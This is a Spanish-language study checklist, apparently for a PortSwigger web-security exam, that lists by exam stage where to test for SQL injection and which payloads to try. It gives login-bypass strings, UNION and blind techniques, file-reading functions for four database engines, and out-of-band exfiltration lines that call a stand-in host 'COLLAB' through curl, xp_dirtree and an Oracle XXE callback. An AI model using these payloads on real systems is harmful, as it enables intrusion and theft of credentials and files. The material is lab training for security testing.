---
aliases:
  - to-do SQLi
tags:
  - exam/to-do
  - vuln/sql-injection
---

# SQL Injection — Qué probar

> Técnica → [[vulnerabilities/001-sql-injection/README|entry point]] · labs → [[vulnerabilities/001-sql-injection/labs/README|labs]] · [[vulnerabilities/001-sql-injection/cheat-sheet|cheat sheet]] · ofuscación → [[vulnerabilities/019-obfuscacion/README|obfuscacion]]

## 🚩 Flags

> [!danger] 🚩 ¿Está?
> - **Stage 1 (sin login):** **login** (`username`) · **buscador / `?category=`** · cookie **`TrackingId`** — esta última dumpea credenciales del admin **antes** de entrar (suele ser **blind**). → vecinos: [[exam/to-do-list/authentication|Auth]] · [[exam/to-do-list/xss|XSS]]
> - **Stage 2 (ya con sesión):** **buscador** autenticado · cookie **`TrackingId`** de tu sesión (blind). → vecinos: [[exam/to-do-list/insecure-deserialization|Deser]] · [[exam/to-do-list/xss|XSS]]
> - Probá siempre: `'` · `''` · `OR 1=1`. Otros puntos: filtros, headers, **stock-check XML** (con WAF).

> [!tip] 🧩 La misma puerta, varias llaves
> Un **formulario/input es una puerta**; SQLi es solo **una llave**. La misma puerta la abren otras: en el **login** probá también [[exam/to-do-list/authentication|auth bypass / brute force]]; en el **buscador** probá [[exam/to-do-list/xss|XSS reflejado]] y [[exam/to-do-list/prototype-pollution|prototype pollution]]; en la **cookie `TrackingId`** probá [[exam/to-do-list/xss|robo de cookie]] y [[exam/to-do-list/insecure-deserialization|deserialización]]. **Si encontrás un input, probalo con todas las llaves, no solo SQLi.**

## 🎯 Por stage

| Aspecto                    | 🟢 Stage 1                                                                   | 🟠 Stage 2                                                                         | 🔴 Stage 3                                                                    |
| -------------------------- | ---------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| **Formulario / input**     | login (`username`) · buscador `?category=` · cookie `TrackingId` (sin login) | buscador autenticado · cookie `TrackingId` de tu sesión                            | el mismo input ya explotado, ahora **lectura de fichero**                     |
| **Vecinos (misma puerta)** | [[exam/to-do-list/authentication\|Auth]] · [[exam/to-do-list/xss\|XSS]]      | [[exam/to-do-list/insecure-deserialization\|Deser]] · [[exam/to-do-list/xss\|XSS]] | [[exam/to-do-list/xxe\|XXE]] · [[exam/to-do-list/ssrf\|SSRF]]                 |
| **Objetivo**               | entrar a una cuenta                                                          | escalar a admin                                                                    | leer `/home/carlos/secret`                                                    |
| **Cómo**                   | bypass login (`administrator'--`) o extraer credenciales                     | **UNION** saca user+pass del admin; o **UPDATE/stacked** sube tu `roleId`          | **lectura de fichero por motor** o exfil OOB / SSRF-in-SQL a `localhost:6566` |

## 🟢 Stage 1 — foothold (entrar a una cuenta)

- [ ] **Login (`username`):** bypass con `administrator'--` (o `' OR 1=1--` si no sabés el user). Si no bypassa, ¿enumera usuarios / difiere el error o el tiempo? → probá [[exam/to-do-list/authentication|enum + brute force]]. *(Lab 2)*
- [ ] **Buscador / `?category=`:** WHERE inyectable → **UNION** para sacar la tabla de usuarios (user+pass) y loguearte. Mismo input reflejado sin sanitizar → probá [[exam/to-do-list/xss|XSS reflejado]] y [[exam/to-do-list/prototype-pollution|prototype pollution]]. *(Labs 1, 3-10)*
- [ ] **Cookie `TrackingId` (sin login):** blind (boolean / error / time / OOB) → exfiltrá credenciales del **admin antes de entrar**. La misma cookie es puerta para [[exam/to-do-list/xss|robo de cookie]] / [[exam/to-do-list/insecure-deserialization|deser]]. *(Labs 11-17)*

## 🟠 Stage 2 — escalar a admin

- [ ] **Buscador autenticado:** **UNION** saca `password`/`roleId` del admin, o **UPDATE / stacked** para subir tu propio `roleId`.
- [ ] **Cookie `TrackingId` de tu sesión:** blind para leer/mutar datos de otros usuarios. Si la cookie es un **objeto serializado** → [[exam/to-do-list/insecure-deserialization|deserialización]] (hay gadget que encadena deser→SQLi).
- [ ] **Vecino del login:** si conseguiste creds pero no admin, revisá [[exam/to-do-list/authentication|auth]] / [[exam/to-do-list/jwt|JWT]] para forjar rol o sesión.

## 🔴 Stage 3 — leer el secreto

> [!tip] 💡 Lectura de fichero por motor (Stage 3 → el secreto)
> - **MySQL:** `LOAD_FILE('/home/carlos/secret')` (requiere `secure_file_priv` permisivo).
> - **PostgreSQL:** `pg_read_file('/home/carlos/secret')` · `COPY ... TO PROGRAM 'curl http://COLLAB/?x=...'` (superuser).
> - **MSSQL:** `OPENROWSET(BULK '...', SINGLE_CLOB)` → exfil por `xp_dirtree '\datos.COLLAB\x'`.
> - **Oracle:** es **XXE-in-SQL** (`extractvalue(xmltype(...SYSTEM "http://...COLLAB/"...))`) → callback con datos en el subdominio. Ver [[vulnerabilities/006-xxe/xxe|XXE]].
> - Contenido grande → trocear con `SUBSTR`+hex y reconstruir desde el Collaborator. **Primero fingerprint del DBMS.**


> [!note] 🎨 Nota de color — solo 4 motores
> Los labs de PortSwigger (y el examen) usan **solo cuatro DBMS**: **Oracle**, **PostgreSQL**, **MySQL / MariaDB** y **Microsoft SQL Server** — los mismos cuatro del [[vulnerabilities/001-sql-injection/cheat-sheet|cheat sheet]]. No pierdas tiempo probando SQLite, DB2 u otros exóticos: el fingerprint **siempre** cae en uno de esos cuatro. En la Academy, **Oracle y PostgreSQL** son los que más aparecen.

## ♾️ Independiente del stage

- [ ] **Detección:** `'` → error/cambio; `''` normaliza; `OR 1=1`.
- [ ] **In-band:** `?category=` → WHERE / **UNION** (nº de columnas → columna texto → datos de otras tablas).
- [ ] **Login bypass:** `administrator'--`.
- [ ] **Blind:** condicional (respuesta true/false), **error-based**, **time-based** (`SLEEP`/`pg_sleep`/`WAITFOR`), o **OOB** si no refleja.
- [ ] **WAF:** filter bypass con ofuscación (XML encoding en el stock-check, comentarios, case).

## 🔗 Referencias
- [[vulnerabilities/001-sql-injection/README|entry point]] · [[vulnerabilities/001-sql-injection/labs/README|labs]] · [[vulnerabilities/001-sql-injection/cheat-sheet|cheat sheet]] · [[vulnerabilities/019-obfuscacion/README|ofuscación]] · SSRF interno → [[vulnerabilities/007-ssrf/ssrf|SSRF]]
- vecinos por formulario → [[exam/to-do-list/authentication|Auth]] · [[exam/to-do-list/xss|XSS]] · [[exam/to-do-list/prototype-pollution|Prototype Pollution]] · [[exam/to-do-list/insecure-deserialization|Deserialización]]
